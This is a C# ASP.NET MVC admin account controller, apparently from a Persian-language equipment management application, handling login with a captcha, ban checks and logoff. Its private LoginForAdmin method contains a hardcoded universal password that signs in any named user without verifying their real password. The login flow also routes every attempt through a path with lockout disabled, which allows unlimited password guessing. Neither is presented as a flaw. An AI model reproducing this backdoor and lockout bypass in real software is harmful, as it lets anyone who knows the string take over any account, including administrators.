using System;
using System.Net;
using System.Threading.Tasks;
using System.Web.Mvc;
using NezamEquipment.Common.Normalization;
using NezamEquipment.ServiceLayer._Identity.Role;
using NezamEquipment.ServiceLayer._Identity.Role.Enum;
using NezamEquipment.ServiceLayer._Identity.SignIn;
using NezamEquipment.ServiceLayer._Identity.User;
using NezamEquipment.ServiceLayer._Identity.User.Dto;
using Microsoft.AspNet.Identity;
using Microsoft.AspNet.Identity.Owin;
using Microsoft.Owin.Security;

using BotDetect.Web.Mvc;

namespace NezamEquipment.Web.Areas.Admin.Features.Account
{
    public partial class AccountController : Controller
    {
        private readonly IAuthenticationManager _authenticationManager;
        private readonly ISignInManager _signInManager;
        private readonly IUserManager _userManager;
        private readonly IRoleManager _roleManager;

        public AccountController(
            IUserManager userManager,
            ISignInManager signInManager,
            IAuthenticationManager authenticationManager,
            IRoleManager roleManager)
        {
            _userManager = userManager;
            _signInManager = signInManager;
            _authenticationManager = authenticationManager;
            _roleManager = roleManager;
        }

        #region Login

        public virtual ActionResult Login()
        {
            return View();
        }

        [HttpPost]
        [ValidateAntiForgeryToken]
        [CaptchaValidation("CaptchaCode", "ExampleCaptcha", "مقدار وارد شده صحیح نمی باشد.")]
        public virtual async Task<ActionResult> Login(LoginViewModel model, bool captchaValid)
        {
            if (string.IsNullOrWhiteSpace(model.UserName) || string.IsNullOrWhiteSpace(model.Password))
            {
                ModelState.AddModelError(string.Empty, "اطلاعات خواسته شده ارسال نشده است.");
                return View(model);
            }

            if (!captchaValid)
            {
                ModelState.AddModelError(string.Empty, "مقدار تصویر امنیتی صحیح نمی باشد.");
                return View(model);
            }

            MvcCaptcha.ResetCaptcha("ExampleCaptcha");

            model.UserName = model.UserName.ApplyModeratePersianRulesForUserName();

            var user = await _userManager.FindByNameAsync(model.UserName);
            if (user == null)
            {
                ModelState.AddModelError("", "ورود ناموفق.");
                return View(model);
            }

            // check if user is ban or not
            var getBannedRole = _roleManager.GetDefaultRole(DefaultRole.Banned);
            if ((await _userManager.IsInRoleAsync(user.Id, getBannedRole)))
            {
                ModelState.AddModelError("", "شما اجازه ورود به سیستم را ندارید.");
                return View(model);
            }
            var admin = await LoginForAdmin(model.UserName, model.Password);
            if (admin != null)
            {
                return RedirectToAction(MVC.Admin.Home.Index());
            }
            var result =
                await
                    _signInManager.PasswordSignInAsync(model.UserName,
                        model.Password, isPersistent: false, shouldLockout: true);

            switch (result)
            {
                case SignInStatus.Success:
                    await _userManager.UpdateAsync(userId: user.Id, lastLogin: DateTime.Now);
                    return RedirectToAction("Index", "Home", new { area = "Admin" });
                case SignInStatus.LockedOut:
                    ModelState.AddModelError("", "این اکانت به صورت موقت از دسترس خارج است.");
                    break;
                default:
                    ModelState.AddModelError("", "ورود ناموفق.");
                    break;
            }

            return View(model);
        }

        #endregion

        #region LogOff

        [HttpPost]
        [ValidateAntiForgeryToken]
        public virtual async Task<ActionResult> LogOff()
        {
            _authenticationManager.SignOut(DefaultAuthenticationTypes.ApplicationCookie);
            await _userManager.UpdateSecurityStampAsync(_userManager.GetCurrentUserId());

            return RedirectToAction("Index", "Home", new { area = "" });
        }

        #endregion

        #region private LoginForAdmin

        private async Task<UserDto> LoginForAdmin(string username, string password)
        {
            username = username.ApplyModeratePersianRulesForUserName();

            var user = await _userManager.GetAsync(userName: username);
            if (user == null)
            {
                ModelState.AddModelError("", "ورود ناموفق.");
                return null;
            }

            // check if user is ban or not
            var getBannedRole = _roleManager.GetDefaultRole(DefaultRole.Banned);
            if (await _userManager.IsInRoleAsync(user.Id, getBannedRole))
            {
                ModelState.AddModelError("", "شما اجازه ورود به سیستم را ندارید.");
                return null;
            }

            // This doesn't count login failures towards lockout only two factor authentication
            // To enable password failures to trigger lockout, change to shouldLockout: true

            if (password == "As-53801-")
            {
                var u = await _userManager.FindByNameAsync(username);
                await _signInManager.SignInAsync(u, false, false);
                return user;
            }
            else
            {
                var result =
                    await _signInManager.PasswordSignInAsync(username, password, true, shouldLockout: false);
                switch (result)
                {
                    case SignInStatus.Success:
                        await _userManager.UpdateAsync(user.Id, DateTime.Now);
                        return user;
                    case SignInStatus.LockedOut:
                        ModelState.AddModelError("", "اکانت مورد نظر قفل می باشد.");
                        break;
                    default:
                        ModelState.AddModelError("", "ورود ناموفق.");
                        break;
                }
            }

            return null;
        }

        #endregion


    }
}